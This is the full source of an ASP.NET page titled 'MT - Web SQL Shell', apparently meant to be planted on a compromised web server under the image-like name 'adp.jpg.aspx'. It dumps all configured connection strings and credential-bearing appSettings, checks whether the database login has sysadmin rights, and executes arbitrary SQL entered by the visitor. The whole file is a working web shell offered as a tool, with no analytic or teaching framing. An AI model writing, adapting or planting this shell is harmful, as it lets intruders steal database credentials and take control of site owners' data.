<% @ Page Language="VB" %>
<% Response.Buffer=True %>
<html>
<head><title>MT - Web SQL Shell</title></head>
<body>
<form action="adp.jpg.aspx" method="POST">
<h2>Connection Strings</h2>
<b>&lt;connectionStrings&gt;</b><br><br>
<table border="1">
<tr>
	<th>Select</th>
	<th>Name</th>
	<th>Connection String</th>
</tr>
<%
Dim css = ConfigurationManager.ConnectionStrings
''' Collect all the connection strings in an array
Dim connStrings(css.Count) As String
For i As Integer = 0 To css.Count - 1
	Response.Write("<tr><td align='center'>")
	Response.Write("<input type='radio' name='cs' value='" & i & "'")
	''' Ensure selected option remains selected
	if (Request.Form("submit") = "Get Info" or Request.Form("submit") = "Execute") and i = Request.Form("cs") then
		Response.Write(" checked")
	end if
	Response.Write("></td><td>")
	Response.Write(css.Item(i).Name)
	Response.Write("</td><td>")
	Response.Write(css.Item(i).ConnectionString)
	connStrings(i) = css.Item(i).ConnectionString
	Response.Write("</td></tr>")
Next i
%>
</table><br>
<b>&lt;appSettings&gt;</b><br>
<i>By default this script tries to identify connection strings from &lt;appSettings&gt; by looking for certain keywords in the key name and value.<br>
<%
if Request.Form("submit") = Nothing or Request.Form("submit") = "Revert" or ((Request.Form("submit") = "Get Info" or Request.Form("submit") = "Execute") and Request.Form("getAll") = Nothing) then
	Response.Write("To see all keys, click the Get All button.</i><br><br><input name='submit' type='submit' value='Get All'><br><br>")
else
	Response.Write("To go back to the default list, click the Revert button.</i><br><br><input name='submit' type='submit' value='Revert'><br><br>")
end if
%>
<table border="1">
<tr>
	<th>Select</th>
	<th>Name</th>
	<th>Connection String</th>
</tr>
<%
Dim index = connStrings.Length - 1
Dim key, value
Dim getAll = False
For Each key in ConfigurationManager.AppSettings
	value = ConfigurationManager.AppSettings(key)
	if Request.Form("submit") = "Get All" or ((Request.Form("submit") = "Get Info" or Request.Form("submit") = "Execute") and Request.Form("getAll") <> Nothing) then
		Response.Write("<input type='hidden' name='getAll' value='1' />")
		getAll = True
	end if
	''' Look for evidence of a connection string by keywords (it is big but it's not clever)
	if getAll or key.IndexOf("con", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("DSN", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("data", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("source", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("database", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("server", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("uid", StringComparison.OrdinalIgnoreCase)>-1 or value.IndexOf("user", StringComparison.OrdinalIgnoreCase)>-1 then
		Response.Write("<tr><td align='center'>")
		Response.Write("<input type='radio' name='cs' value='" & index & "'")
		''' Ensure selected option remains selected
		if (Request.Form("submit") = "Get Info" or Request.Form("submit") = "Execute") and index = Request.Form("cs") then
			Response.Write(" checked")
		end if
		Response.Write("></td><td>")
		Response.Write(key)
		Response.Write("</td><td>")
		Response.Write(ConfigurationManager.AppSettings(key))
		Response.Write("</td></tr>")
		connStrings(index) = ConfigurationManager.AppSettings(key)
		''' Expand the array by 1 and keep current values
		ReDim Preserve connStrings(connStrings.Length)
		index = index + 1
	end if
Next
%>
</table><br>
<input name="submit" type="submit" value="Get Info"><br>

<h2>SQL</h2>
<textarea name="sql" rows="5" cols="75" wrap="soft"><% Response.write(Request.Form("sql")) %></textarea><br>
<input name="submit" type="submit" value="Execute">
</form>

<%
Response.Write("<h2>Output</h2>")
if Request.Form("cs") = "" then
	Response.Write("No connection string set")
else if Request.Form("submit") = "Execute" or Request.Form("submit") = "Get Info" then
	Dim connStr = connStrings(Request.Form("cs")) 
	Dim odbc = False
	Dim conn, reader
	Try
		if connStr.IndexOf("DSN", StringComparison.OrdinalIgnoreCase)>-1 then
			conn = New System.Data.Odbc.OdbcConnection(connStr)
			odbc = True
		else
			conn = New System.Data.SqlClient.SqlConnection(connStr)
		end if
		conn.Open()
		Dim cmd, infoQueries
		Dim getInfo = False
		if Request.Form("submit") = "Get Info" then
			infoQueries = New String(,) { {"SELECT @@version","server"}, {"SELECT db_name()","database"}, {"SELECT user","user"}, {"SELECT system_user","system_user"}, {"SELECT is_srvrolemember('sysadmin')","sysadmin?"}, {"SELECT is_srvrolemember('serveradmin')","serveradmin?"} }
			getInfo = True
		else
			infoQueries = New String(,) { {Request.Form("sql"),""} }
		end if
		Response.Write("<table border='1'>")
		For index = 0 to infoQueries.GetUpperBound(0)
			if odbc then
				cmd = New System.Data.Odbc.OdbcCommand(infoQueries(index,0), conn)
			else
				cmd = New System.Data.SqlClient.SqlCommand(infoQueries(index,0), conn)
			end if
			reader = cmd.ExecuteReader()
			if Not reader.hasRows then
				Response.Write("</table><i>No rows returned</i>")
			end if
			Dim colNames As Boolean = True
			''' Read a row at a time
			While reader.Read()
				Response.Write("<tr>")
				Dim i as Integer
				''' If Get Info requested, output a friendly name to describe each query
				if getInfo then
					Response.Write("<td><b>" & infoQueries(index,1) & "</b></td>")
					colNames = False
				end if
				''' The first row of output should be the column names
				if colNames then
					For i = 0 To reader.FieldCount - 1
					Response.Write("<th>")
					Response.Write(reader.GetName(i))
					Response.Write("</th>")
					Next
					Response.Write("</tr><tr>")
				end if
				For i = 0 To reader.FieldCount - 1
					Response.Write("<td>")
					Response.Write(reader.GetValue(i))
					Response.Write("</td>")
				Next
				Response.Write("</tr>")
				colNames = False
			End While
			reader.Close()
		Next
	Catch ex As Exception
		Response.write("<i><b>Something went wrong...</b><br>" & ex.Message & "</i>")
	Finally
		if reader isNot Nothing then
			reader.Close()
		end if
		if conn isNot Nothing then
			conn.Close()
		end if
		Response.Write("</table>")
		Response.Write("<script>window.scrollTo(0,document.body.scrollHeight);</script>")
	End Try
end if
%>
</body>
</html>